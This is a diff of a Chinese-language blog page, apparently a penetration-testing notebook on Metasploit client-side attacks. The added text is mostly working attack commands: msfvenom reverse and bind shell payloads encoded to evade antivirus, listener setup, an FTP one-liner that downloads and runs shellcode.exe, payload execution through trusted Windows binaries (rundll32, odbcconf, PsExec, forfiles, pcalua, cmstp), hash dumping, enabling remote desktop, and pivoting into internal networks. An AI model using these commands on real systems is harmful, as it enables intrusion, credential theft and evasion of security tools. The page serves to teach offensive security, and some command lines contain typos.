@@ -8,7 +8,7 @@
   
   
   
-  <title>Metasploit客戶端攻擊 | JohnScott2046的博客</title>
+  <title>15Metasploit客戶端攻擊 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>Metasploit客戶端攻擊</span>
+    <span>15Metasploit客戶端攻擊</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -298,8 +298,15 @@
 <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 -b “\x00\x0ff” -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/win.exe</p>
 <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=34.146.243.221 lport=4444 -b “\x00\x0ff” -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/win.exe</p>
 <p>监听模块</p>
-<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 4444<br>exploit</p>
-<h3 id="二、-Linux"><a href="#二、-Linux" class="headerlink" title="二、 Linux"></a>二、 Linux</h3><p>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 -b “\x00\x0ff” -a x64 –platform linux -i 5 -f elf -o /var/www/html/linux</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lhost 34.92.39.82<br>set lport 4444<br>exploit</p>
+<p>开启3389<br>run post/windows/manage/enable_rdp</p>
+<h3 id="windows-FTP反弹shell"><a href="#windows-FTP反弹shell" class="headerlink" title="windows FTP反弹shell"></a>windows FTP反弹shell</h3><p>其中ftp目录下有 shellcode.exe 文件</p>
+<p>echo ftp&gt;&gt;1.txt&amp;&amp;echo open 192.168.1.200 21&gt;&gt;1.txt&amp;&amp;echo root&gt;&gt;1.txt&amp;&amp;echo root&gt;&gt;1.txt&amp;&amp;echo bin&gt;&gt;1.txt&amp;&amp;echo get shellcode.exe&gt;&gt;1.txt&amp;&amp;echo bye&gt;&gt;1.txt&amp;&amp;ftp -s:1.txt&amp;&amp;shellcode.exe</p>
+<p>连接目标ftp，然后下载文件 shellcode.exe 并执行</p>
+<h3 id="正向SHELL"><a href="#正向SHELL" class="headerlink" title="正向SHELL"></a>正向SHELL</h3><p>正向就是目标机器运行exe，攻击机器去连接；<br>反向reverse shell就是通过监听，让目标机器运行exe连接攻击机器，攻击机器会收到一个反弹shell；</p>
+<p>msfvenom -p windows/shell_hidden_bind_tcp LPORT=9988 AHOST=192.168.1.230 -f exe &gt; bind_shell.exe</p>
+<p>telnet 192.168.1.200 9988</p>
+<h3 id="二、-Linux"><a href="#二、-Linux" class="headerlink" title="二、 Linux"></a>二、 Linux</h3><p>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.230 lport=5555 -b “\x00\x0ff” -a x64 –platform linux -i 5 -f elf -o /var/www/html/linux</p>
 <p>-p：指定需要使用的 payload；<br>LHOST：攻击机 IP 地址；<br>LPORT：攻击机端口；<br>-b：规避坏字符，比如: &amp; #039;\x00\xff&amp; #039; -a: 指定 payload 的目标架构; –platform：指定 payload 的目标平台；<br>-i：指定 payload 的编码次数。编码次数越多，尽可能的绕过 AV 厂家；<br>-f：指定输出格式，elf：linux 系统的可执行文件类型<br>-o 指定文件名称和导出位置。 #/var/www/html 網站根目錄</p>
 <p>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 4444<br>run</p>
 <p>–download-only 方式下载软件包不进行安装<br>apt –download-only install screenfetc</p>
@@ -335,8 +342,74 @@
 <p>生成exe文件</p>
 <p>use windows/windows_defender_hs_hta<br>show options<br>set filename 1.hta<br>run </p>
 <p>生成exe文件</p>
-<h3 id="查杀引擎"><a href="#查杀引擎" class="headerlink" title="查杀引擎"></a>查杀引擎</h3><p><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a><br><a target="_blank" rel="noopener" href="http://www.virscan.org/">www.virscan.org</a></p>
-<p>nodistribute.com</p>
+<h3 id="查杀引擎"><a href="#查杀引擎" class="headerlink" title="查杀引擎"></a>查杀引擎</h3><p><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a><br><a target="_blank" rel="noopener" href="http://www.virscan.org/">www.virscan.org</a><br>nodistribute.com</p>
+<h3 id="基于白名单Rundll32上线"><a href="#基于白名单Rundll32上线" class="headerlink" title="基于白名单Rundll32上线"></a>基于白名单Rundll32上线</h3><p>Rundll32是指32位的DLL文件，它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库</p>
+<p>基于本地加载dll上线</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.230 lport=9988 -f dll &gt; shellcode.dll</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 9988<br>run</p>
+<p>然后把刚刚MSF生成的 shellcode.dll 上传到目标服务器，加载rundll32.exe运行</p>
+<p>rundll32.exe 目录 C:\Windows\SysWOW64\rundll32.exe<br>rundll32.exe shell32.dll,Control_RunDLL D:\kali\www\shellcode.dll</p>
+<p>Rundll32命令执行</p>
+<p>rundll32.exe还可以执行命令，可绕过一些waf：（打开远程桌面）<br>rundll32.exe javascript:”..\mshtml.dll,RunHTMLApplication “;eval(“w=new ActiveXObject(&quot;WScript.Shell&quot;);w.run(&quot;mstsc&quot;);window.close()”);</p>
+<h3 id="基于白名单odbcconf-exe上线"><a href="#基于白名单odbcconf-exe上线" class="headerlink" title="基于白名单odbcconf.exe上线"></a>基于白名单odbcconf.exe上线</h3><p>ODBCCONF.exe 是一种命令行工具，可用于配置 ODBC 驱动程序和数据源的名称</p>
+<p>先MSF生成一个dll用于加载上线<br>msfvenom –platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.230 lport=9988 -f dll &gt; 9988.dll</p>
+<p>设置MSF监听</p>
+<p>最后把9988.dll文件上传到靶机服务器并执行命令成功上线<br>odbcconf.exe /a {regsvr D:\kali\www\9988.dll}</p>
+<h3 id="基于白名单PsExec远程加载Payload上线"><a href="#基于白名单PsExec远程加载Payload上线" class="headerlink" title="基于白名单PsExec远程加载Payload上线"></a>基于白名单PsExec远程加载Payload上线</h3><p>PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性</p>
+<p>缺点：第一次运行会弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<p>在MSF上生成Payload<br>msfvenom -a  x86 –platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=9988 -f msi &gt; shellcode.msi</p>
+<p>设置MSF监听<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost=192.168.1.230<br>set lport 9988<br>run</p>
+<p>Kali开启一个HTTP服务用于远程加载<br>python -m SimpleHTTPServer 9000</p>
+<p>下载到我们本地<br><a target="_blank" rel="noopener" href="http://192.168.1.230:9000/shellcode.msi">http://192.168.1.230:9000/shellcode.msi</a></p>
+<p>之后在目标靶机上运行PsExec.exe反弹shell到Kali<br>PsExec.exe -d -s msiexec.exe /q /i <a target="_blank" rel="noopener" href="http://192.168.1.230:9000/shellcode.msi">http://192.168.1.230:9000/shellcode.msi</a></p>
+<h3 id="基于白名单Forfukes远程加载Payload上线"><a href="#基于白名单Forfukes远程加载Payload上线" class="headerlink" title="基于白名单Forfukes远程加载Payload上线"></a>基于白名单Forfukes远程加载Payload上线</h3><p>Forfiles为Windows默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用</p>
+<p>缺点：需要让攻击者手动点击安装，还需要过UAC</p>
+<p>首先MSF生成一个Payload</p>
+<p>msfvenom -a x86 –platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=9988 -f msi &gt; 9988.msi</p>
+<p>设置MSF监听</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost=192.168.1.230<br>set lport 9988<br>run</p>
+<p>然后使用Python开启一个HTTP服务用于远程加载Payload：</p>
+<p>python -m SimpleHTTPServer 9000</p>
+<p>这个时候我们访问 <a target="_blank" rel="noopener" href="http://192.168.1.230:9000/9988.msi">http://192.168.1.230:9000/9988.msi</a> 就能够下载到。</p>
+<p>随后让靶机运行命令远程加载Payload上线：<br>forfiles /p c:\windows\system32 /m cmd.exe /c  “msiexec.exe /q /i <a target="_blank" rel="noopener" href="http://192.168.1.230:9000/9988.msi&quot;">http://192.168.1.230:9000/9988.msi&quot;</a></p>
+<h3 id="基于白名单Ocalua执行Payload上线"><a href="#基于白名单Ocalua执行Payload上线" class="headerlink" title="基于白名单Ocalua执行Payload上线"></a>基于白名单Ocalua执行Payload上线</h3><p>Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的一个组件</p>
+<p>缺点：exe落地到服务器有可能会被自带的杀软查杀</p>
+<p>msfvenom -a x86 –platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=9988 -f exe &gt; 9988.exe</p>
+<p>设置MSF监听</p>
+<p>之后吧9988.exe上传到目标服务器pcalua加载运行上线<br>Pcalua -m -a 9988.exe</p>
+<h3 id="基于白名单Cmstp-exe执行Payload上线"><a href="#基于白名单Cmstp-exe执行Payload上线" class="headerlink" title="基于白名单Cmstp.exe执行Payload上线"></a>基于白名单Cmstp.exe执行Payload上线</h3><p>Cmstp安装或删除”连接管理器”服务配置文件。如果不含可选参数的情况下使用，则 cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件</p>
+<p>微软官方文档<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</a></p>
+<p>首先MSF生成一个Payload：（x64）<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=9988 -f dll &gt; 9988.dll</p>
+<p>设置MSF进行监听</p>
+<p>接着新建一个 <code>9988.inf</code> 文件，修改 RegisterOCXSection 为 MSF生成的dll路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line"> </span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs&#x3D;RegisterOCXSection</span><br><span class="line"> </span><br><span class="line">[RegisterOCXSection]</span><br><span class="line">C:\Users\root\Desktop\9988.dll</span><br><span class="line"> </span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;krystal&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;krystal&quot;</span><br></pre></td></tr></table></figure>
+
+<p>接着把两个文件，9988.inf和9988.dll上传到目标服务器，运行命令加载上线</p>
+<p>cmstp.exe /s 9988.inf</p>
+<h3 id="远程加载Shellcode实现免杀"><a href="#远程加载Shellcode实现免杀" class="headerlink" title="远程加载Shellcode实现免杀"></a>远程加载Shellcode实现免杀</h3><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=53 -b ‘\x00’ -f c |grep -v unsigned|sed “s/&quot;\\x//g”|sed “s/\\x//g”|sed “s/&quot;//g”|sed ‘:a;N;$!ba;s/\n//g’|sed “s/;//g”</p>
+<p>ruby shellcode.rb 8080</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.1681.230<br>set lport 53<br>exploit</p>
+<p>目标机运行<br>PrintSpoofer.exe -i -c “shellcode.exe 8080 192.168.1.230”</p>
+<p>上线后可以获取，可以使用下面两种方法抓hash</p>
+<ol>
+<li>hashdump  </li>
+<li>run post/windows/gather/smart_hashdump  结果不太准</li>
+</ol>
+<p>开启3389<br>run post/windows/manage/enable_rdp</p>
+<p>内网主机搜集<br>run get_local_subnets</p>
+<p>路由内网扫描<br>run autoroute -s 10.10.1.0/24</p>
+<p>arp模块对内网进行扫描存活主机<br>run arp_scanner -r 10.10.1.0/24</p>
+<p>内网渗透</p>
+<ol>
+<li>添加一个socks代理<br>use auxiliary/server/socks4a<br>show options<br>run</li>
+</ol>
+<p>vim /etc/proxychains.conf<br>socks4 127.0.0.1 1080</p>
+<p>端口扫描<br>proxychains nmap -sT -Pn -p 1-65535 10.10.1.100</p>
+<p>一定要使用proxychains代理来打开浏览器<br>proxychains firefox</p>
+<h3 id="Shellcode本地加载实现免杀绕过"><a href="#Shellcode本地加载实现免杀绕过" class="headerlink" title="Shellcode本地加载实现免杀绕过"></a>Shellcode本地加载实现免杀绕过</h3><p>msfvenom -p windows/meterpreter/bind_tcp  lport=9898 -e x86 /ikata_ga_nai -i 5 -f raw &gt; test.c</p>
+<p>proxychains msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/bind_tcp<br>set lport 9898<br>set rhost 10.10.1.130</p>
+<p>目标机器运行<br>shellcode_launcher.exe -i test.c</p>
     </div>
   </div>
   
@@ -439,13 +512,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">Metasploit信息搜集</a>
+        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">13Metasploit信息搜集</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/16SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A4%8E/" target="_self">SQL注入基礎</a>
+        <a href="/2021/16SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A4%8E/" target="_self">16SQL注入基礎</a>
         <i class="iconfont icon-next"></i>
       </div>
     
